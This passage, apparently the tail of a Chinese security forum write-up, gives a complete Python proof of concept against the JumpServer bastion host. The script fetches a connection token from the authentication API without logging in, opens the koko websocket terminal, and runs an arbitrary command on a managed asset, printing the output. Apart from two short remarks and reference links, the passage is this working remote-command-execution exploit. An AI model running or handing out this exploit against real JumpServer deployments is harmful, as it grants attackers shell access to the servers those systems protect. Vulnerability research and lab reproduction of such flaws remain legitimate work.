<p>发现有点慢。改成python 连接一下。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141914-16071686-5955-1.png"/></p>
<p>改一下输出格式<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210118141934-2251247c-5955-1.png"/></p>
<p>POC 如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">asyncio</span>
<span class="kn">import</span> <span class="nn">websockets</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>


<span class="c1"># 向服务器端发送认证后的消息</span>
<span class="n">async</span> <span class="k">def</span> <span class="nf">send_msg</span><span class="p">(</span><span class="n">websocket</span><span class="p">,</span><span class="n">_text</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">_text</span> <span class="o">==</span> <span class="s2">"exit"</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'you have enter "exit", goodbye'</span><span class="p">)</span>
        <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">close</span><span class="p">(</span><span class="n">reason</span><span class="o">=</span><span class="s2">"user exit"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">_text</span><span class="p">)</span>
    <span class="n">recv_text</span> <span class="o">=</span> <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="c1">#print(f"{recv_text}")</span>
    <span class="c1">#recv_text=json.loads(recv_text)</span>
   <span class="c1"># print(recv_text['data'])</span>


<span class="n">async</span> <span class="k">def</span> <span class="nf">main_logic</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s2">"#######start ws"</span><span class="p">)</span>
    <span class="n">async</span> <span class="k">with</span> <span class="n">websockets</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="k">as</span> <span class="n">websocket</span><span class="p">:</span>
        <span class="n">recv_text</span> <span class="o">=</span> <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"{recv_text}"</span><span class="p">)</span>
        <span class="n">resws</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">recv_text</span><span class="p">)</span>
        <span class="nb">id</span> <span class="o">=</span> <span class="n">resws</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"get ws id:"</span><span class="o">+</span><span class="nb">id</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"###############"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"init ws"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"###############"</span><span class="p">)</span>
        <span class="n">inittext</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"id"</span><span class="p">:</span> <span class="nb">id</span><span class="p">,</span> <span class="s2">"type"</span><span class="p">:</span> <span class="s2">"TERMINAL_INIT"</span><span class="p">,</span> <span class="s2">"data"</span><span class="p">:</span> <span class="s2">"{</span><span class="se">\"</span><span class="s2">cols</span><span class="se">\"</span><span class="s2">:164,</span><span class="se">\"</span><span class="s2">rows</span><span class="se">\"</span><span class="s2">:17}"</span><span class="p">})</span>
        <span class="n">await</span> <span class="n">send_msg</span><span class="p">(</span><span class="n">websocket</span><span class="p">,</span><span class="n">inittext</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
            <span class="n">recv_text</span> <span class="o">=</span> <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="c1">#recv_text=json.loads(recv_text)</span>
           <span class="c1"># print(f"{recv_text['data']}")</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"###############"</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"exec cmd: </span><span class="si">%s</span><span class="s2">"</span><span class="o">%</span><span class="n">cmd</span><span class="p">)</span>
        <span class="n">cmdtext</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">"id"</span><span class="p">:</span> <span class="nb">id</span><span class="p">,</span> <span class="s2">"type"</span><span class="p">:</span> <span class="s2">"TERMINAL_DATA"</span><span class="p">,</span> <span class="s2">"data"</span><span class="p">:</span> <span class="n">cmd</span><span class="o">+</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">})</span>
        <span class="k">print</span><span class="p">(</span><span class="n">cmdtext</span><span class="p">)</span>
        <span class="n">await</span> <span class="n">send_msg</span><span class="p">(</span><span class="n">websocket</span><span class="p">,</span> <span class="n">cmdtext</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">20</span><span class="p">):</span>
            <span class="n">recv_text</span> <span class="o">=</span> <span class="n">await</span> <span class="n">websocket</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">recv_text</span><span class="o">=</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">recv_text</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">recv_text</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'#######finish'</span><span class="p">)</span>


<span class="n">url</span> <span class="o">=</span> <span class="s2">"/api/v1/authentication/connection-token/?user-only=None"</span>
<span class="n">host</span><span class="o">=</span><span class="s2">"http://192.168.1.73:8080"</span>
<span class="n">cmd</span><span class="o">=</span><span class="s2">"ifconfig"</span>
<span class="k">if</span> <span class="n">host</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s1">'/'</span><span class="p">:</span>
    <span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"user"</span><span class="p">:</span> <span class="s2">"4320ce47-e0e0-4b86-adb1-675ca611ea0c"</span><span class="p">,</span> <span class="s2">"asset"</span><span class="p">:</span> <span class="s2">"ccb9c6d7-6221-445e-9fcc-b30c95162825"</span><span class="p">,</span>
        <span class="s2">"system_user"</span><span class="p">:</span> <span class="s2">"79655e4e-1741-46af-a793-fff394540a52"</span><span class="p">}</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"##################"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"get token url:</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="n">url</span><span class="p">,))</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"##################"</span><span class="p">)</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span> <span class="o">+</span> <span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">"token"</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"token:</span><span class="si">%s</span><span class="s2">"</span><span class="p">,</span> <span class="p">(</span><span class="n">token</span><span class="p">,))</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"##################"</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="s2">"ws://"</span> <span class="o">+</span> <span class="n">host</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"http://"</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"/koko/ws/token/?target_id="</span> <span class="o">+</span> <span class="n">token</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"target ws:</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">target</span><span class="p">,))</span>
<span class="n">asyncio</span><span class="o">.</span><span class="n">get_event_loop</span><span class="p">()</span><span class="o">.</span><span class="n">run_until_complete</span><span class="p">(</span><span class="n">main_logic</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
</pre></div>
<p>参考:<br/>
<a href="https://github.com/jumpserver/jumpserver" target="_blank">https://github.com/jumpserver/jumpserver</a><br/>
<a href="https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw" target="_blank">https://mp.weixin.qq.com/s/KGRU47o7JtbgOC9xwLJARw</a></p>
</div>
</div>